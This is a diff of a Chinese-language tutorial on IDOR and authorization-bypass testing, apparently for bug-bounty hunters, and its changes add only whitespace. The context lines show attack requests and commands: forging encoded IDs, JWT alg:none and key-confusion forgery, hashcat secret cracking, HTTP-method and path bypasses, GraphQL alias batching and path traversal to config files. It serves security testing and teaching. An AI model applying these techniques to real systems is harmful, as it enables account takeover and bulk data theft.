@@ -19,6 +19,7 @@ tags: [越权, idor, 绕过, 实战]
 ## 2.加密/编码 ID 的绕过
 ### 2.1：Base64 编码 ID
 有些应用把 ID 做 Base64 编码，觉得"攻击者看不懂"。
+
 ```
 # 你看到的请求
 GET /api/profile?token=eyJ1c2VyX2lkIjoxMjN9
@@ -30,10 +31,12 @@ GET /api/profile?token=eyJ1c2VyX2lkIjoxMjR9
 # 工具：Burp 的 Decoder 面板，或命令行
 echo -n '{"user_id":124}' | base64
 ```
+
  实战要点
 Base64 不是加密，是编码。看到 = 结尾、字符集是 A-Za-z0-9+/ 的，先解码看看。 URL 中的 Base64 可能用 - 和 _ 替代 + 和 /（URL-safe Base64）。
 ### 2.2：Hash/签名 ID
 有些应用用 MD5(user_id) 或 HMAC(user_id, secret) 作为参数。
+
 ```
 # 你看到的请求
 GET /api/order?uid=202cb962ac59075b964b07152d234b70
@@ -61,6 +64,7 @@ for i in range(1, 10001):
 
 ### 2.3：AES/DES 加密 ID — 前端泄露密钥
 有些应用用 AES 加密 ID，看起来无懈可击。但密钥写在前端 JS 里——等于锁了门把钥匙挂在门把手上。
+
 ```
 # 步骤1：在前端 JS 中搜索加密密钥
 # DevTools → Sources → Search（Ctrl+Shift+F）
@@ -78,12 +82,14 @@ console.log(encrypted.toString());  // → 拿到 124 的加密 token
 # 步骤3：用这个 token 发请求
 GET /api/order?token=<加密后的124>
 ```
+
 真实案例:
 某金融 APP 前端用 AES-ECB 加密用户 ID，密钥硬编码在 JS 中。攻击者在 Console 里调用前端的加密函数， 生成任意用户 ID 的加密 token，批量遍历全部用户账户余额和交易记录。
 ## 3.JWT 操纵 — 垂直越权
 JWT（JSON Web Token）是现代 API 最常用的认证方式。很多开发者把角色/权限信息直接写在 JWT payload 中，而且不做服务端校验。
 
 **JWT 结构拆解**
+
 ```
 # JWT 由三部分组成：Header.Payload.Signature（用 . 分隔）
 eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.xxxxx
@@ -94,8 +100,10 @@ eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0.xxxxx
 
 # ⭐ 攻击思路：如果服务端不验证签名，直接改 Payload 就行
 ```
+
 ### 3.1：alg: none 绕过
 JWT 标准允许 "alg":"none"，表示不签名。如果服务端信任这个声明，你就能伪造任意 Token。
+
 ```
 
 # 原始 Token 的 Header: {"alg":"HS256","typ":"JWT"}
@@ -130,6 +138,7 @@ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 # 爆破成功后，用密钥重新签名任意 Payload
 # 在 jwt.io 上输入密钥，修改 role 为 admin，生成新 Token
 ```
+
 ### 3.3：算法混淆攻击（RS256 → HS256）
 服务端用 RS256（非对称），公钥公开。如果库实现有缺陷，你可以把算法改成 HS256（对称），用公钥当 HMAC 密钥签名。
 
@@ -148,9 +157,11 @@ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 
 # ⭐ 影响：Python pyjwt < 1.5.1、Node jsonwebtoken < 4.2.2 等均有此漏洞
 ```
+
 ## 4.HTTP 方法绕过
 很多 API 网关只对 GET/POST 做了权限控制，忘了管其他方法。
 ### 4.1方法切换绕过
+
 ```
 # 场景：GET 被拦截（403 Forbidden）
 GET /admin/users HTTP/1.1
@@ -187,6 +198,7 @@ X-HTTP-Method-Override: GET
 /admin.json   → 200  ← 加后缀
 /admin?       → 200  ← 问号
 ```
+
 ⭐ 自动化工具 Burp 插件 ：Bypass WAF
 或用 Intruder 批量测试路径变体。 也可以用 ffuf：`ffuf -w bypass.txt -u https://target.com/FUZZ`
 ## 5.GraphQL IDOR — 很多团队根本不会防
@@ -204,6 +216,7 @@ POST /graphql
 #           orders(userId: ID!): [Order]
 #           document(id: ID!): Document
 ```
+
 ### 5.2GraphQL IDOR 的 3 种利用方式
 
 ```
@@ -232,11 +245,13 @@ POST /graphql
 #   1000 次尝试 = 1 个 HTTP 请求，限流器只数到 1
 # ⚠️ 若服务端按 resolver 调用次数限流（如"每分钟最多 5 次 login"），别名无效
 ```
+
 真实案例:某社交平台 GraphQL 接口，user(id:X) 返回手机号和邮箱，无权限校验。 攻击者用别名攻击一次请求查 50 个用户，绕过速率限制，5 分钟拖了 10 万用户数据。SRC 评级：严重
 ## 6.文件操作中的 IDOR — 最容易漏检
 开发者在做 API 权限校验时很认真，但文件下载/上传接口经常被遗漏。
 
 ### 6.1文件下载 IDOR
+
 ```
 # 场景：下载自己的发票
 GET /download?file=invoice_123.pdf
@@ -253,6 +268,7 @@ GET /download?file=../../config/database.yml
 # 发票通常按日期+用户ID命名
 # invoice_20240101_123.pdf → 遍历 _1 到 _10000
 ```
+
 ### 6.2导出接口 IDOR
 
 ```
